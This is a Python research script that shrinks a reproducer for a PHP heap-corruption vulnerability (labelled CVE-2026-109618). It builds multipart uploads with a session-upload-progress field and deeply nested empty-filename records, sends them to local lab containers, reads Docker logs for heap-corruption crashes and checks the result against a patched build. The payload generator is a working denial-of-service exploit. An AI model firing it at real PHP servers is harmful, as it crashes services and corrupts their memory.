#!/usr/bin/env python3
"""c_minimize.py -- shrink the CVE-2026-109618 reproducer without losing the differential.

Search space: (parts, depth) of the nested filename="" records.

Rules:
  * a candidate is accepted only if corruption reproduces in >=2 of N trials
    AND the OOM signal is still present (otherwise we are testing something else);
  * the baseline (600,45) is always run first and preserved as the reference;
  * the final candidate is re-verified with more trials on both the vulnerable
    and a patched build.

Usage:
  python3 c_minimize.py \
    --vuln-url http://127.0.0.1:8084/decode.php --vuln-container php2shell-cat-c-vuln \
    --patched-url http://127.0.0.1:8088/decode.php --patched-container p2s-c8427 \
    --trials 3 --final-trials 5 --out c_minimized.json

Authorized laboratory testing only.
"""
import argparse, json, subprocess, sys, time, uuid
from datetime import datetime, timezone

import requests

ABORT_PAT = "zend_mm_heap corrupted|exit signal|Segmentation fault"


def now():
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def abort_count(container):
    out = subprocess.run(
        "docker logs --tail 400 %s 2>&1 | grep -cE '%s'" % (container, ABORT_PAT),
        shell=True, capture_output=True, timeout=25).stdout.decode()
    try:
        return int(out.strip() or 0)
    except ValueError:
        return 0


def trigger(url, sid, parts, depth):
    b = "----a" + uuid.uuid4().hex
    out = [("--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\""
            "\r\n\r\np\r\n" % b).encode()]
    for i in range(parts):
        name = "files[%d]" % i + "".join("[k%d]" % j for j in range(depth))
        out.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"\""
                    "\r\n\r\n" % (b, name)).encode())
    out.append(("--%s--\r\n" % b).encode())
    body = b"".join(out)

    def gen():
        for i in range(0, len(body), 8192):
            yield body[i:i + 8192]

    oom = False
    try:
        r = requests.post(url, data=gen(), cookies={"PHPSESSID": sid},
                          headers={"Content-Type": "multipart/form-data; boundary=" + b},
                          timeout=60)
        oom = "Allowed memory" in r.text
    except Exception:
        pass
    # phase B: progress field, no file part
    bd = "----b" + uuid.uuid4().hex
    p = ("--%s\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\""
         "\r\n\r\np\r\n--%s--\r\n" % (bd, bd)).encode()
    try:
        requests.post(url, data=p, cookies={"PHPSESSID": sid},
                      headers={"Content-Type": "multipart/form-data; boundary=" + bd},
                      timeout=30)
    except Exception:
        pass
    return oom


def measure(url, container, parts, depth, trials):
    ooms = hits = 0
    for i in range(trials):
        before = abort_count(container)
        oom = trigger(url, "min%02d%s" % (i, uuid.uuid4().hex[:6]), parts, depth)
        after = abort_count(container)
        if oom:
            ooms += 1
        if after > before:
            hits += 1
        time.sleep(0.25)
    return {"parts": parts, "depth": depth, "trials": trials,
            "oom": ooms, "hits": hits, "ok": hits >= 2 and ooms >= 1}


def search_parts(url, container, depth, lo, hi, trials):
    best = None
    print("  [parts] searching in [%d,%d] at depth=%d" % (lo, hi, depth))
    while lo < hi:
        mid = (lo + hi) // 2
        m = measure(url, container, mid, depth, trials)
        print("    parts=%d -> oom=%d/%d hits=%d/%d" % (mid, m["oom"], trials, m["hits"], trials))
        if m["ok"]:
            best = mid; hi = mid
        else:
            lo = mid + 1
    return best if best is not None else lo


def search_depth(url, container, parts, lo, hi, trials):
    best = None
    print("  [depth] searching in [%d,%d] at parts=%d" % (lo, hi, parts))
    while lo < hi:
        mid = (lo + hi) // 2
        m = measure(url, container, parts, mid, trials)
        print("    depth=%d -> oom=%d/%d hits=%d/%d" % (mid, m["oom"], trials, m["hits"], trials))
        if m["ok"]:
            best = mid; hi = mid
        else:
            lo = mid + 1
    return best if best is not None else lo


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--vuln-url", required=True)
    ap.add_argument("--vuln-container", required=True)
    ap.add_argument("--patched-url")
    ap.add_argument("--patched-container")
    ap.add_argument("--trials", type=int, default=3)
    ap.add_argument("--final-trials", type=int, default=5)
    ap.add_argument("--out", default="c_minimized.json")
    a = ap.parse_args()

    print("c_minimize  %s" % now())
    print("[*] baseline 600x45")
    base = measure(a.vuln_url, a.vuln_container, 600, 45, a.final_trials)
    print("    oom=%d/%d hits=%d/%d" % (base["oom"], a.final_trials, base["hits"], a.final_trials))
    if base["hits"] == 0:
        sys.exit("[!] baseline does not reproduce; refusing to minimize")

    p = search_parts(a.vuln_url, a.vuln_container, 45, 1, 600, a.trials)
    d = search_depth(a.vuln_url, a.vuln_container, p, 1, 45, a.trials)
    # one refinement pass: a smaller depth may allow fewer parts again
    p2 = search_parts(a.vuln_url, a.vuln_container, d, 1, p, a.trials)
    cand = measure(a.vuln_url, a.vuln_container, p2, d, a.final_trials)
    print("[*] candidate %dx%d -> oom=%d/%d hits=%d/%d"
          % (p2, d, cand["oom"], a.final_trials, cand["hits"], a.final_trials))

    patched = None
    if a.patched_url and a.patched_container:
        patched = measure(a.patched_url, a.patched_container, p2, d, a.final_trials)
        print("[*] patched control -> oom=%d/%d hits=%d/%d"
              % (patched["oom"], a.final_trials, patched["hits"], a.final_trials))
        # Differential integrity: the patched build must ALSO reach the OOM at this
        # size, otherwise "no corruption" is just "no memory pressure".
        while patched["oom"] == 0 and p2 < 600:
            p2 = min(600, int(p2 * 1.5) + 1)
            cand = measure(a.vuln_url, a.vuln_container, p2, d, a.final_trials)
            patched = measure(a.patched_url, a.patched_container, p2, d, a.final_trials)
            print("[*] grow to %dx%d -> vuln oom=%d hits=%d | patched oom=%d hits=%d"
                  % (p2, d, cand["oom"], cand["hits"], patched["oom"], patched["hits"]))

    report = {
        "tool": "c_minimize v1.0.0",
        "generated": now(),
        "baseline": base,
        "candidate": cand,
        "patched_control": patched,
        "differential_preserved": bool(
            patched is not None and cand["hits"] >= 2
            and patched["hits"] == 0 and patched["oom"] > 0),
        "scope": "Corruption is a denial-of-service observation; no RCE attempted.",
    }
    with open(a.out, "w") as fh:
        json.dump(report, fh, indent=2)
    print("\nresult: %dx%d  (%.1f%% of baseline records)"
          % (p2, d, 100.0 * (p2 * d) / (600 * 45)))
    print("differential preserved: %s" % report["differential_preserved"])
    print("report -> %s" % a.out)


if __name__ == "__main__":
    main()
